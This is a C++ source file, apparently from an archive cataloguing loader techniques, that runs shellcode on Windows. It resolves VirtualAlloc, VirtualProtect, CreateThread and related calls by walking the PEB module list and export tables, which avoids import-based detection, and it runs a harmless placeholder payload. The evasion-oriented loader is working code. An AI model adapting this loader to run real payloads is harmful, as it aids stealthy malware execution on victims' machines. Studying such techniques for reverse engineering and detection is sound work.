/*
    Shellcode Loader
    Archive of Reversing.ID

    Resolve function by walking PEB module list and PE export table.
    Function is identified by comparing export names directly.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tpcode.cpp

Technique:
    - access:       manual PE export walk by name (PEB module list)
    - allocation:   VirtualAlloc
    - writing:      RtlMoveMemory
    - permission:   VirtualProtect
    - execution:    CreateThread

Note:
    - resolve_name_from_base: walk export table of a single module base.
    - resolve_name: discover modules via PEB InMemoryOrderModuleList,
      then delegate to resolve_name_from_base (no LoadLibrary/GetProcAddress).
    - alternative of PEB InMemoryOrderModuleList can be seen in access/module-enumeration/
*/

#include <windows.h>
#include <stdint.h>

/* ========= PEB / loader structures ========= */
typedef struct _MY_UNICODE_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    PWSTR   Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY        InLoadOrderLinks;
    LIST_ENTRY        InMemoryOrderLinks;
    LIST_ENTRY        InInitializationOrderLinks;
    PVOID             DllBase;
    PVOID             EntryPoint;
    ULONG             SizeOfImage;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY, *PMY_LDR_ENTRY;

typedef struct _MY_PEB_LDR_DATA {
    ULONG       Length;
    BOOL        Initialized;
    PVOID       SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

/* ========= function signatures ========= */
typedef LPVOID WINAPI VirtualAlloc_t(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   WINAPI VirtualProtect_t(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   WINAPI VirtualFree_t(LPVOID, SIZE_T, DWORD);
typedef HANDLE WINAPI CreateThread_t(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  WINAPI WaitForSingleObject_t(HANDLE, DWORD);

typedef VirtualAlloc_t        FAR * pVirtualAlloc;
typedef VirtualProtect_t      FAR * pVirtualProtect;
typedef VirtualFree_t         FAR * pVirtualFree;
typedef CreateThread_t        FAR * pCreateThread;
typedef WaitForSingleObject_t FAR * pWaitForSingleObject;


/* =================== name compare and resolvers =================== */

/*
    Compare two null-terminated ASCII strings byte by byte.
    No CRT or loader APIs used.
*/
static BOOL name_equal (const char * a, const char * b)
{
    while (*a && *b)
    {
        if (*a != *b)
            return FALSE;
        a++;
        b++;
    }
    return *a == *b;
}

/*
    Search for the function by name in the single loaded module.
    Walk the export table and compare the name.

    Args:
        base:           base address of the module (HMODULE / DllBase)
        target_name:    name of the function to search for

    Returns:
        address of the function if found, otherwise NULL
*/
static FARPROC resolve_name_from_base (PVOID base, const char * target_name)
{
    PBYTE                   image = (PBYTE) base;
    PIMAGE_DOS_HEADER       dos   = (PIMAGE_DOS_HEADER) image;
    PIMAGE_NT_HEADERS       nt    = (PIMAGE_NT_HEADERS) (image + dos->e_lfanew);
    DWORD                   exp_rva;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD  * names;
    WORD   * ordinals;
    DWORD  * funcs;
    DWORD    i;

    // get the RVA of the export table
    exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exp_rva == 0)
        return NULL;

    // resolve the name
    exp      = (PIMAGE_EXPORT_DIRECTORY) (image + exp_rva);
    names    = (DWORD *) (image + exp->AddressOfNames);
    ordinals = (WORD *)  (image + exp->AddressOfNameOrdinals);
    funcs    = (DWORD *) (image + exp->AddressOfFunctions);

    for (i = 0; i < exp->NumberOfNames; i++)
    {
        const char * fn_name = (const char *) (image + names[i]);
        if (name_equal (fn_name, target_name))
            return (FARPROC) (image + funcs[ordinals[i]]);
    }

    return NULL;
}

/*
    Resolve a function across all loaded modules.
    Walking the PEB->Ldr->InMemoryOrderModuleList and calling resolve_name_from_base
    for each DllBase. 
    Avoids LoadLibrary/GetModuleHandle/GetProcAddress.
    Returns NULL if not found in any loaded module.

    Args:
        target_name:    name of the function to search for

    Returns:
        address of the function if found, otherwise NULL
*/
static FARPROC resolve_name (const char * target_name)
{
    PMY_PEB_LDR_DATA ldr;
    PLIST_ENTRY      list;
    PLIST_ENTRY      entry;

    // read PEB.Ldr from thread-local segment register
#ifdef _WIN64
    ldr = *(PMY_PEB_LDR_DATA *) (__readgsqword (0x60) + 0x18);
#else
    ldr = *(PMY_PEB_LDR_DATA *) (__readfsdword (0x30) + 0x0C);
#endif

    list  = &ldr->InMemoryOrderModuleList;
    entry = list->Flink;

    // iterate through the module list
    while (entry != list)
    {
        PMY_LDR_ENTRY mod = CONTAINING_RECORD (entry, MY_LDR_ENTRY, InMemoryOrderLinks);
        FARPROC       result;

        if (mod->DllBase != NULL)
        {
            // resolve the name from the module base
            result = resolve_name_from_base (mod->DllBase, target_name);
            if (result != NULL)
                return result;
        }
        entry = entry->Flink;
    }
    return NULL;
}


int main ()
{
    void *  runtime     = NULL;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // function pointers resolved at runtime
    pVirtualAlloc           fn_VirtualAlloc;
    pVirtualProtect         fn_VirtualProtect;
    pVirtualFree            fn_VirtualFree;
    pCreateThread           fn_CreateThread;
    pWaitForSingleObject    fn_WaitForSingleObject;

    // resolve functions by walking PEB and export table
    fn_VirtualAlloc        = (pVirtualAlloc)        resolve_name ("VirtualAlloc");
    fn_VirtualProtect      = (pVirtualProtect)      resolve_name ("VirtualProtect");
    fn_VirtualFree         = (pVirtualFree)         resolve_name ("VirtualFree");
    fn_CreateThread        = (pCreateThread)        resolve_name ("CreateThread");
    fn_WaitForSingleObject = (pWaitForSingleObject) resolve_name ("WaitForSingleObject");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = fn_VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval = fn_VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        h_thread = fn_CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        fn_WaitForSingleObject (h_thread, -1);
    }

    // deallocate the space
    fn_VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}
